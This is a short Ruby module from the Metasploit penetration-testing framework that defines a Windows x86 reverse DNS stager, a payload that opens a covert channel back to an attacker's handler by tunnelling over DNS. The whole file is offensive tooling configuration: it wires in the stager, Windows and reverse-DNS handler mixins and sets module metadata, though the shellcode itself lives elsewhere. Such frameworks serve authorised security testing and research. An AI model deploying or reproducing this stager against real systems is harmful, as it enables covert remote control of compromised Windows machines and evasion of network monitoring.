##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 339

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseDns

  def initialize(info = {})
    super(merge_info(info,
                     'Name'        => 'Windows Reverse DNS Stager',
                     'Description' => 'Tunnel communication over reverse DNS',
                     'Author'      => 'Alexey Sintsov',
                     'License'     => MSF_LICENSE,
                     'Platform'    => 'win',
                     'Arch'        => ARCH_X86,
                     'Handler'     => Msf::Handler::ReverseDns,
                     'Stager'      => { 'RequiresMidstager' => false },
                     'Convention'  => 'sockedi dns'))
  end
end

